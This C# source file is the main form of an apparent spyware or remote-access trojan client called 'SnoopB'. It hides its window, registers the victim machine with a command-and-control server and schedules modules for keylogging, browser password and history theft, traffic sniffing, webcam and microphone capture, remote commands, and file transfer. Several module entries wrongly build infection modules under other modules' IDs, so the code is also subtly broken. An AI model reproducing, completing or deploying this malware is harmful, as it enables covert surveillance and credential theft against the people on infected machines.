using System;
using System.Collections.Generic;
using System.Windows.Forms;
using SnoopB.Configuration;
using SnoopB.Connection;
using SnoopB.Modules;
using SnoopB.Modules.BrowserHistoryStealer;
using SnoopB.Modules.BrowserPasswordStealer;
using SnoopB.Modules.Command;
using SnoopB.Modules.FileDownloader;
using SnoopB.Modules.FileExplorer;
using SnoopB.Modules.FileUploader;
using SnoopB.Modules.HttpTrafficSniffer;
using SnoopB.Modules.Infection;
using SnoopB.Modules.Keylogger;
using SnoopB.Modules.Mic;
using SnoopB.Modules.Process;
using SnoopB.Modules.ScreenCapture;
using SnoopB.Modules.Webcam;

namespace SnoopB
{
    public partial class FrmMain : Form
    {
        private CommandAndControl _commandAndControl;
        private List<Module> _modules = new List<Module>();

        public FrmMain()
        {
            InitializeComponent();
            Hide();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            if (CommandAndControl.Ping(Configurator.Instance.UniqueId))
            {
                CommandAndControl.RegisterMachineAlive(Configurator.Instance.UniqueId);

                InitModules();

                foreach (var m in Modules)
                    AddClock(m);
            }
            else
            {
                //TODO: what happens if we dont have connectiviy?
            }
        }

        private void InitModules()
        {
            var configs = CommandAndControl.GetModuleConfigurations(Configurator.Instance.UniqueId);
            _modules.Add(new ScreenCaptureModule(GetIntervalForModuleId(ScreenCaptureModule.ModuleId, configs)));
            _modules.Add(new BrowserPasswordStealerModule(GetIntervalForModuleId(BrowserPasswordStealerModule.ModuleId, configs)));
            _modules.Add(new BrowserHistoryStealerModule(GetIntervalForModuleId(BrowserHistoryStealerModule.ModuleId, configs)));
            _modules.Add(new HttpTrafficSnifferModule(GetIntervalForModuleId(HttpTrafficSnifferModule.ModuleId, configs)));
            _modules.Add(new KeyloggerModule(GetIntervalForModuleId(KeyloggerModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(InfectionModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(CommandModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(FileExplorerModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(FileUploader.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(FileDownloaderModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(ProcessModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(WebcamModule.ModuleId, configs)));
            _modules.Add(new InfectionModule(GetIntervalForModuleId(MicModule.ModuleId, configs)));
        }

        private int GetIntervalForModuleId(string moduleId, List<ModuleConfiguration> configs)
        {
            foreach (var config in configs)
            {
                if (config.ModuleId == moduleId)
                    return config.Interval;
            }

            return 0;
        }

        private void AddClock(Module module)
        {
            const int minutesToMiliSeconds = 1000 * 60;

            var clock = new Timer { Interval = module.MinutesInterval * minutesToMiliSeconds, Enabled = module.IsEnabled };
            clock.Tick += (sender, args) => module.Execute();
            clock.Start();  
        }

        private List<Module> Modules
        {
            get { return _modules; }
            set { _modules = value; }
        }

        private CommandAndControl CommandAndControl
        {
            get { return _commandAndControl; }
            set { _commandAndControl = value; }
        }

    }
}